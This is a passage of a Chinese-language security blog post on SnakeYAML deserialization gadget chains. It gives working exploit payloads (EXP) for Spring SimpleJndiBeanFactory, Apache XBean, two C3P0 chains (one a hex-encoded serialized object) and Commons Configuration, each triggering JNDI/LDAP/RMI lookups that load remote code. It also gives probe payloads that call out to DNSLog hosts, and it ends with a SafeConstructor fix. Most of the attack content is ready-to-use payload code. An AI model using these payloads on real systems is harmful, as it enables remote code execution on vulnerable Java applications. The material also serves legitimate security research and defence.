function_">getBean</span><span class="params">(String name, Class&lt;T&gt; requiredType)</span> <span class="keyword">throws</span> BeansException &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (isSingleton(name)) &#123;</span><br><span class="line">        <span class="keyword">return</span> doGetSingleton(name, requiredType);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> lookup(name, requiredType);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (NameNotFoundException ex) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchBeanDefinitionException</span>(name, <span class="string">&quot;not found in JNDI environment&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (TypeMismatchNamingException ex) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanNotOfRequiredTypeException</span>(name, ex.getRequiredType(), ex.getActualType());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (NamingException ex) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanDefinitionStoreException</span>(<span class="string">&quot;JNDI environment&quot;</span>, name, <span class="string">&quot;JNDI lookup failed&quot;</span>, ex);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>SimpleJndiBeanFactory#getBean</code>方法中，如果想造成jndi，我们就需要走入else代码块中</p>
+<p>我们看到<code>isSingleton</code>方法内，要判断shareableResources中是否包含<code>name</code>（即为我们的ldap地址），因此我们需要为shareableResources赋值</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isSingleton</span><span class="params">(String name)</span> <span class="keyword">throws</span> NoSuchBeanDefinitionException &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">this</span>.shareableResources.contains(name);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在shareableResources的setter方法中可以看到，该setter方法是为该参数添加一个String类，我们只需要将我们的ldap地址传入即可</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setShareableResources</span><span class="params">(String... shareableResources)</span> &#123;</span><br><span class="line">		Collections.addAll(<span class="built_in">this</span>.shareableResources, shareableResources);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>除此之外，在<code>setBeanFactory</code>方法内，存在一些对链子有一些干扰的参数，我们只需要简单赋值即可越过</p>
+<p>EXP如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">YamlSpring</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!org.springframework.beans.factory.config.PropertyPathFactoryBean &quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;targetBeanName: \&quot;ldap://127.0.0.1:8085/WRTOPmjx\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot; propertyPath: sean,&quot;</span> +</span><br><span class="line">                <span class="string">&quot; beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory &#123;&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;shareableResources: [\&quot;ldap://127.0.0.1:8085/WRTOPmjx\&quot;]&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&#125;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="aJfDU">Apache XBean</h3>
+
+<ul>
+<li>该链无版本限制</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.xbean<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xbean-naming<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.20<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>链尾在<code>ContextUtil</code>内部类<code>ReadOnlyBinding</code>的<code>getObject</code>方法中，其中有一个<code>resolve</code>方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> resolve(value, getName(), <span class="literal">null</span>, context);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>NamingManager.getObjectInstance</code>就是我们的JNDI漏洞点，我们只需要将我们的ldap地址，包装为一个<code>Reference</code>传入到该方法中，即可造成JNDI注入</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">resolve</span><span class="params">(Object value, String stringName, Name parsedName, Context nameCtx)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(value <span class="keyword">instanceof</span> Reference)) &#123;</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> (Reference) value;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// for SimpleReference we can just call the getContext method</span></span><br><span class="line">        <span class="keyword">if</span> (reference <span class="keyword">instanceof</span> SimpleReference) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> ((SimpleReference) reference).getContent();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> e;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> (NamingException) <span class="keyword">new</span> <span class="title class_">NamingException</span>(<span class="string">&quot;Could not look up : &quot;</span> + stringName == <span class="literal">null</span>? parsedName.toString(): stringName).initCause(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// for normal References we have to do it the slow way</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (parsedName == <span class="literal">null</span>) &#123;</span><br><span class="line">                parsedName = NAME_PARSER.parse(stringName);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> NamingManager.getObjectInstance(reference, parsedName, nameCtx, nameCtx.getEnvironment());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (NamingException) <span class="keyword">new</span> <span class="title class_">NamingException</span>(<span class="string">&quot;Could not look up : &quot;</span> + stringName == <span class="literal">null</span>? parsedName.toString(): stringName).initCause(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样就构造好了Reference类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;!!javax.naming.Reference [\&quot;Sean\&quot;,\&quot;WRTOPmjx\&quot;,\&quot;http://127.0.0.1:8085/\&quot;]&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>接下来构造<code>ReadOnlyBinding</code>类（这里的第三个参数，我找到的是<code>InitialContext</code>类）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding [\&quot;Sean\&quot;,!!javax.naming.Reference [\&quot;Sean\&quot;,\&quot;WRTOPmjx\&quot;,\&quot;http://127.0.0.1:8085/\&quot;],!!javax.naming.InitialContext &#123;&#125;]&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们将我们的类，反序列化后，调用其<code>getObject</code>方法，观察是否能执行</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XBean</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding [\&quot;Sean\&quot;,!!javax.naming.Reference [\&quot;Sean\&quot;,\&quot;WRTOPmjx\&quot;,\&quot;http://127.0.0.1:8085/\&quot;],!!javax.naming.InitialContext &#123;&#125;]&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        ContextUtil.<span class="type">ReadOnlyBinding</span> <span class="variable">load</span> <span class="operator">=</span> (ContextUtil.ReadOnlyBinding)yaml.load(payload);</span><br><span class="line">        load.getObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在执行<code>getObject</code>时，爆出了错误，发现是我们的<code>Context</code>有问题，这里就直接换成别的师傅那里拿来的<code>WritableContext</code>类了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743210046939-c3c5eef6-0754-4868-9b29-dac6c8ae2c71.png"></p>
+<p>使用如下POC，调用getObject方法，即可造成JNDI注入</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding [\&quot;Sean\&quot;,!!javax.naming.Reference [\&quot;Sean\&quot;,\&quot;WRTOPmjx\&quot;,\&quot;http://127.0.0.1:8085/\&quot;],!!org.apache.xbean.naming.context.WritableContext &#123;&#125;]&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743210490268-f626878f-6ad8-4ad0-a8d3-32af0a94d2bc.png"></p>
+<p>但是我们该怎么去触发这个<code>getObject</code>方法</p>
+<p>其中我们找到<code>BadAttributeValueExpException</code>类，可以看到这里去调用了传入val的toString方法，而<code>ReadOnlyBinding</code>是没有<code>toString</code>方法的，那就看他的父类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">BadAttributeValueExpException</span> <span class="params">(Object val)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.val = val == <span class="literal">null</span> ? <span class="literal">null</span> : val.toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>恰巧他的父类<code>Binding</code>的<code>toString</code>方法中，调用了本类的<code>getObject</code>方法，即可触发</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ReadOnlyBinding</span> <span class="keyword">extends</span> <span class="title class_">Binding</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.toString() + <span class="string">&quot;:&quot;</span> + getObject();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>最终EXP如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!javax.management.BadAttributeValueExpException [!!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding [\&quot;Sean\&quot;,!!javax.naming.Reference [\&quot;Sean\&quot;,\&quot;WRTOPmjx\&quot;,\&quot;http://127.0.0.1:8085/\&quot;],!!org.apache.xbean.naming.context.WritableContext &#123;&#125;]]&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743210939037-ddab4274-f419-4687-ae8b-4902b5e0ab9f.png"></p>
+<h3 id="FRPd3">C3P0 JndiRefForwardingDataSource</h3>
+C3P0这条链子之前已经有了较为详细的分析，这里就不再过多赘述
+
+<p>EXP如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P0JndiRefForwardingDataSourceEXP</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!com.mchange.v2.c3p0.JndiRefForwardingDataSource\n&quot;</span> +  </span><br><span class="line">        <span class="string">&quot;  jndiName: \&quot;rmi://localhost/Exploit\&quot;\n&quot;</span> +  </span><br><span class="line">        <span class="string">&quot;  loginTimeout: 0&quot;</span>;  </span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();  </span><br><span class="line">        yaml.load(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="zoBh0">C3P0 WrapperConnectionPoolDataSource</h3>
+同样也是一条C3P0的链子，EXP如下（<font style="color:rgb(80, 80, 92);">二次反序列化的 payload</font>）
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\n&quot;</span> +  </span><br><span class="line"><span class="string">&quot;  userOverridesAsString: \&quot;HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400074578706c6f6974740016687474703a2f2f6c6f63616c686f73743a383030302f740003466f6f;\&quot;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Gwf3k">Apache Commons Configuration</h3>
+依赖如下
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-configuration<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-configuration<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>感觉这条链子逆向分析较难，我先把EXP放出来（太难了TvT）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poc = <span class="string">&quot;!!org.apache.commons.configuration.ConfigurationMap [!!org.apache.commons.configuration.JNDIConfiguration [!!javax.naming.InitialContext [], \&quot;rmi://127.0.0.1:1099/Exploit\&quot;]]: 1&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这里是利用Map调用key的<code>hashCode</code>时所造成的利用链</p>
+<p>从EXP来看，会调用<code>JNDIConfiguration#hashCode</code>方法，但是该类没有<code>hashCode</code>方法，就会向上调用，实际执行了<code>AbstractMap#hashCode</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;  </span><br><span class="line">    Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();  </span><br><span class="line">    <span class="keyword">while</span> (i.hasNext())  </span><br><span class="line">        h += i.next().hashCode();  </span><br><span class="line">    <span class="keyword">return</span> h;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在上面调用<code>entrySet().iterator()</code>即调用<code>ConfigurationMap.ConfigurationSet#iterator</code>，然后回调用<code>JNDIConfiguration</code>的<code>getKeys</code>方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Iterator&lt;Map.Entry&lt;Object, Object&gt;&gt; iterator() &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ConfigurationSetIterator</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="title function_">ConfigurationSetIterator</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.keys = ConfigurationSet.<span class="built_in">this</span>.configuration.getKeys();</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>getKeys</code>方法会调用到<code>getBaseContext</code>方法内</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Iterator&lt;String&gt; <span class="title function_">getKeys</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getKeys(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Iterator&lt;String&gt; <span class="title function_">getKeys</span><span class="params">(String prefix)</span> &#123;</span><br><span class="line">        String[] splitPath = StringUtils.split(prefix, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">        List&lt;String&gt; path = Arrays.asList(splitPath);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="built_in">this</span>.getContext(path, <span class="built_in">this</span>.getBaseContext());</span><br><span class="line">            Set&lt;String&gt; keys = <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">            <span class="keyword">if</span> (context != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.recursiveGetKeys(keys, context, prefix, <span class="keyword">new</span> <span class="title class_">HashSet</span>());</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.containsKey(prefix)) &#123;</span><br><span class="line">                keys.add(prefix);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> keys.iterator();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NameNotFoundException var6) &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">new</span> <span class="title class_">ArrayList</span>()).iterator();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var7) &#123;</span><br><span class="line">            <span class="type">NamingException</span> <span class="variable">e</span> <span class="operator">=</span> var7;</span><br><span class="line">            <span class="built_in">this</span>.fireError(<span class="number">5</span>, (String)<span class="literal">null</span>, (Object)<span class="literal">null</span>, e);</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">new</span> <span class="title class_">ArrayList</span>()).iterator();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>在这里的<code>lookup</code>方法就会造成JNDI注入</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Context <span class="title function_">getBaseContext</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.baseContext == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.baseContext = (Context)<span class="built_in">this</span>.getContext().lookup(<span class="built_in">this</span>.prefix == <span class="literal">null</span> ? <span class="string">&quot;&quot;</span> : <span class="built_in">this</span>.prefix);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.baseContext;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="HBQzd">SnakeYaml探测</h2>
+使用SPI的链子就可以完成探测工作，但是如果SPI机制被ban情况下，我们可以使用如下方法绕过
+
+<h3 id="z8ulA">使用 Key 调用 hashCode 方法探测：</h3>
+POC如下
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;!!java.net.URL [\&quot;http://ra5zf8uv32z5jnfyy18c1yiwfnle93.oastify.com/\&quot;]: 1&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>我们根据urldns链可以知道key会进行<code>hashCode</code>方法的调用，之后进行urldns的解析</p>
+<p>SnakeYaml在进行map的处理的时候将会对key进行hashCode处理，所以我们尝试map的格式</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    hashMap.put(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">    hashMap.put(<span class="string">&quot;b&quot;</span>, <span class="string">&quot;b&quot;</span>);</span><br><span class="line">    System.out.println(yaml.dump(hashMap));</span><br><span class="line"><span class="comment">// &#123;a: a, b: b&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>所以我们就可以按照这种使用<code>&#123; &#125;</code>包裹的形式构造map，然后将指定的URL置于key位置</p>
+<h4 id="ZIHWq">探测内部类</h4>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;!!java.util.Map &#123;&#125;: 0,!!java.net.URL [\&quot;http://tcbua9.ceye.io/\&quot;]: 1&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>在前面加上需要探测的类，在反序列化的过程中如果没有报错，就说明反序列化成功了的，进而存在该类</p>
+<p>这里创建对象的时候使用的是<code>&#123;&#125;</code>这种代表的是无参构造，所以需要存在有无参构造函数，不然需要使用<code>[]</code>进行赋值构造</p>
+<h2 id="fafJz">漏洞修复</h2>
+SnakeYaml 官方并没有把这一种现象作为漏洞看待
+
+<p>修复方法就是通过添加<code>new SafeConstructor()</code>进行过滤，如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>(<span class="keyword">new</span> <span class="title class_">SafeConstructor</span>());</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>请我一杯咖啡吧！</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.jpg" alt="Sean 微信">
+        <span>微信</span>
+      </div>
+      <div>
+        <img src="/images/alipay.jpg" alt="Sean 支付宝">
+        <span>支付宝</span>
+      </div>
+
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/SnakeYaml/" rel="tag"># SnakeYaml</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
